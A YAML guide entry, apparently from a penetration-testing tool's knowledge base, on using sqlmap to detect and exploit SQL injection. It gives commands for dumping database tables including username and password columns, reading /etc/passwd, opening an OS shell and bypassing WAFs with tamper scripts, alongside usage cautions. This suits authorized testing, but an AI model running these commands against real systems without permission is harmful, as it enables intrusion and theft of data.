id: tool-sqlmap
name: SQLmap SQL Injection Tool
category: tools
description: >
  Guide for using sqlmap to detect and exploit SQL injection vulnerabilities.
  Covers detection, data extraction, WAF bypass, and safe usage practices.

when_to_use:
  - "After manual testing confirms or strongly suggests SQL injection"
  - "To automate data extraction after confirming an injection point"
  - "To identify the DBMS type and version for targeted exploitation"
  - "To test WAF bypass techniques on confirmed injection points"
  - "NOT as a first-pass scanner — use manual testing or numasec sqli scanner first"

basic_usage:
  get_param: "sqlmap -u 'http://target/page?id=1' --batch --level=2 --risk=2"
  post_param: "sqlmap -u 'http://target/login' --data='user=admin&pass=test' --batch"
  cookie_inject: "sqlmap -u 'http://target/page' --cookie='session=abc123' -p session --batch"
  from_request: "sqlmap -r request.txt --batch  (saved HTTP request from Burp/proxy)"

advanced_flags:
  enumerate_dbs: "--dbs  (list all databases)"
  enumerate_tables: "-D dbname --tables  (list tables in database)"
  dump_table: "-D dbname -T tablename --dump  (extract table data)"
  specific_columns: "-D dbname -T users -C username,password --dump"
  os_shell: "--os-shell  (attempt command execution — requires DBA privileges)"
  file_read: "--file-read=/etc/passwd  (read file via SQLi — requires FILE privilege)"
  tamper_scripts: "--tamper=space2comment,between  (WAF bypass via payload transformation)"
  technique_select: "--technique=BEUSTQ  (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline)"
  proxy: "--proxy=http://127.0.0.1:8080  (route through Burp for inspection)"
  threads: "--threads=4  (parallel requests — faster but noisier)"

output_interpretation:
  detection_confirmed:
    - "'Parameter X is vulnerable' — injection confirmed"
    - "'Type: boolean-based blind' — indicates the technique that worked"
    - "'back-end DBMS: MySQL' — identifies the database engine"
  no_injection:
    - "'all tested parameters do not appear to be injectable' — try higher --level/--risk"
    - "Consider testing different parameters, headers, or content types"
  key_output:
    - "Extracted database names, table names, and column data in structured format"
    - "DBMS version, current user, current database, DBA status"
    - "Number of entries extracted vs total entries in table"

common_pitfalls:
  - "Running sqlmap on unconfirmed injection points — wastes time and generates noise"
  - "Using --level=5 --risk=3 as default — extremely slow and may cause damage"
  - "Not using --batch — sqlmap prompts interactively, blocking automation"
  - "Forgetting --tamper when behind a WAF — default payloads get blocked"
  - "Using --dump-all on production — extracts everything, extremely dangerous"
  - "Not specifying -p parameter — sqlmap tests every parameter, much slower"
